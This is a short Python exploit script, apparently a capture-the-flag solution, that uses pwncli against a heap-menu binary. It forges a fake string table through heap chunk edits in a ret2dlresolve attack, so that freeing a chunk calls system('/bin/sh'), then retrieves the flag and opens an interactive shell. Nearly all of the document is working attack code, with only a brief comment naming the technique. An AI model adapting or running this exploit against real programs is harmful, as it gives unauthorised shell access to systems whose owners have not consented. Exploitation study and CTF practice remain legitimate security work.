#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(data):
    p.send(p8(1))
    p.send(p8(len(data)))
    p.send(data)

def edit(idx:int, data):
    p.send(p8(2))
    p.send(p8(idx))
    p.send(p8(len(data)))
    p.send(data)

def free(idx):
    p.send(p8(3))
    p.send(p8(idx))

"""
ret2dlresolve
fake strtab
fake str
when resolve free, the program will jump to system 
"""

strtab_addr = 0x601eb0
bss_addr = 0x602100
free_str_offset = 0x5f

add("a"*0x10)
add("a"*0x10)
add("a"*0x10)
add("a"*0x10)

# stop()
edit(0, flat({0x18:[0x21, 8, strtab_addr],
                0x38:0x21,
                0x58:[0x21, 8, bss_addr]}))

edit(1, p64(bss_addr))

edit(2, flat({0: "/bin/sh", 0x5f:"system"}, filler="\x00"))

free(2)

get_flag_when_get_shell(p)

p.interactive()